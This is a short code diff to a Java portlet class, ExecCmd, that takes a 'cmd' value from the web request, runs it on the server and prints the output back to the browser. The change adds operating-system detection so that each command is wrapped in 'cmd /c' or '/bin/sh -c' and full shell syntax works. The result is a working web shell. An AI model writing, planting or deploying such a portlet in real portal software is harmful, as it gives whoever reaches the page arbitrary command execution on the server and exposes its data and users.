@@ -22,6 +22,18 @@ public class ExecCmd extends GenericPortlet {
 	public void doView(RenderRequest request, RenderResponse response)
 	throws PortletException, IOException
 	{
+
+        String OS;
+        String prefix;
+
+        OS = System.getProperty("os.name");
+        if (OS.startsWith("Windows")){
+            prefix = "cmd /c ";
+        }
+        else{
+            prefix = "/bin/sh -c ";
+        }
+
 		response.setContentType("text/html");
 		PrintWriter writer = response.getWriter();
 		writer.println("<p>Execute command</p>");
@@ -35,9 +47,9 @@ public class ExecCmd extends GenericPortlet {
 		if (cmd == null) {
 			writer.println("<p>No command to execute</p>");
 		} else {
-			writer.println("<p>Executing: "+cmd+"</p>");
+			writer.println("<p>Executing: "+prefix+cmd+"</p>");
 			writer.println("<hr><pre>");
-			Process p = Runtime.getRuntime().exec(cmd);
+			Process p = Runtime.getRuntime().exec(prefix+cmd);
 			OutputStream os = p.getOutputStream();
 			InputStream in = p.getInputStream();
 			DataInputStream dis = new DataInputStream(in);
